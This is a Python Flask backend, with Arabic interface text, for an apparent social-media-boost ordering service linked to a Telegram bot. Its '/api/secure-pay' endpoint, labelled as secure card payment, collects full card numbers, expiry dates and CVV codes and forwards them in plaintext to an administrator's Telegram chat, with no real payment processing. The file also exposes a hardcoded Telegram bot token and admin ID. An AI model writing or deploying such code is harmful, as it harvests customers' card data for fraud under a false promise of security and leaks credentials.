from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot
from telebot import types
import os

TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
ADMIN_ID = "6695916631" 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
CORS(app)

# قاعدة بيانات للأرصدة وحالات الدفع
users_db = {"default_user": {"balance": 0.0, "status": "idle"}}

@app.route('/api/balance/default_user', methods=['GET'])
def get_balance():
    return jsonify(users_db["default_user"])

@app.route('/api/secure-pay', methods=['POST'])
def secure_pay():
    data = request.json
    usd = data.get('amount_usd')
    iqd = data.get('amount_iqd')
    users_db["default_user"]["status"] = "waiting"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ قبول ({usd}$)", callback_data=f"pay_ok_{usd}"),
               types.InlineKeyboardButton("❌ رفض", callback_data="pay_no"))
    
    msg = (f"💳 **طلب دفع ماستر كارد**\n"
           f"💵 المبلغ: ${usd} ({iqd:,} IQD)\n"
           f"🔢 البطاقة: `{data.get('card')}`\n"
           f"📅 التاريخ: {data.get('date')} | 🔒 CVV: `{data.get('cvv')}`")
    
    bot.send_message(ADMIN_ID, msg, reply_markup=markup, parse_mode="Markdown")
    return jsonify({"status": "processing"})

@app.route('/api/order', methods=['POST'])
def create_order():
    data = request.json
    cost = float(data.get('cost'))
    if users_db["default_user"]["balance"] < cost:
        return jsonify({"success": False, "message": "رصيدك غير كافٍ"}), 400
    
    users_db["default_user"]["balance"] -= cost
    msg = f"🚀 **طلب رشق جديد**\n🛠 الخدمة: {data.get('service')}\n🔢 الكمية: {data.get('qty')}\n🔗 الرابط: {data.get('link')}\n💵 التكلفة: ${cost}"
    bot.send_message(ADMIN_ID, msg)
    return jsonify({"success": True, "new_balance": users_db["default_user"]["balance"]})

@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def handle_payment(call):
    if "ok" in call.data:
        amount = float(call.data.split('_')[2])
        users_db["default_user"]["balance"] += amount
        users_db["default_user"]["status"] = "approved"
        bot.edit_message_text(f"✅ تم إضافة ${amount}", call.message.chat.id, call.message.message_id)
    else:
        users_db["default_user"]["status"] = "rejected"
        bot.edit_message_text("❌ تم الرفض", call.message.chat.id, call.message.message_id)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
